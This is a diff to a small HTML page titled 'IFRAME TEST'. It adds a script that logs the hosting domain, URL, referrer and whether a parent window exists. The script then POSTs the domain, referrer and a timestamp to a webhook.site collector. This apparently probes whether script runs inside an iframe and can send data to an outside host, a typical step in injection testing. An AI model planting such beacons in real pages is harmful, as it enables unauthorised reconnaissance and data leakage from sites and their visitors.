@@ -1,8 +1,32 @@
 <!DOCTYPE html>
 <html>
-<body>
+<body style="background:red;">
     <h1>IFRAME TEST</h1>
+    <script>
+        console.log('=== IFRAME JAVASCRIPT ACTIVE ===');
+        console.log('Domain:', document.domain);
+        console.log('URL:', window.location.href);
+        console.log('Referrer:', document.referrer);
+        console.log('Parent accessible:', window.parent !== window);
+        
+        // DOM'a da yaz
+        document.body.innerHTML += '<p style="color:white;">JS WORKING: ' + new Date() + '</p>';
+        
+        // Webhook dene
+        fetch('https://webhook.site/702e64e6-a3b1-4c90-b2ff-d53f3db32498', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                test: 'console_version',
+                domain: document.domain,
+                referrer: document.referrer,
+                timestamp: new Date().toISOString()
+            })
+        }).then(() => {
+            console.log('Webhook sent successfully');
+        }).catch(e => {
+            console.log('Webhook error:', e);
+        });
+    </script>
 </body>
 </html>
-
-
